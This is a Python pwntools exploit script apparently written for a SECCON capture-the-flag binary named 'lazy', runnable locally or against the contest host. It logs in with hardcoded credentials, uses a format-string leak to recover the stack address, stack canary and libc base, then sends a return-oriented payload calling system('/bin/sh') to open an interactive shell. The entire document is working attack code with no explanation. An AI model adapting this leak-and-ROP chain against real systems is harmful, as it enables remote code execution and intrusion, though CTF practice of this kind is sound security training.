#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./lazy')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    system = libc.symbols['system']
    libc_start_main = libc.symbols['__libc_start_main']
else:
    s = remote('lazy.chal.seccon.jp', 33333)
    system = 0x3f570
    libc_start_main = 0x20640

elf = ELF('./lazy')

def login(username, password):
    s.sendline('2')
    s.sendlineafter('username : ', username)
    s.sendlineafter('password : ', password)

def private(filename):
    s.sendline('4')
    s.sendlineafter('name\n', filename)

login('_H4CK3R_', '3XPL01717')

private('%p %9$p %21$p')
s.recvuntil('Filename : ')
stack_addr, canary, libc_base = map(lambda x: int(x, 0x10), s.recvline(False).split(' '))
log.info('stack address: %#x' % stack_addr)
log.info('canary: %#x' % canary)
libc_base -= libc_start_main + 0xf0
log.info('libc base: %#x' % libc_base)

pop_rdi = 0x4015f3

payload = ''
payload += 'AA' + '\0' * 0x16
payload += p64(canary)
payload += p64(0)
payload += p64(pop_rdi) + p64(stack_addr + 0x26d0)
payload += p64(libc_base + system)
payload += '/bin/sh\0'

private(payload)

s.recvuntil('No such file!\n')

s.interactive()
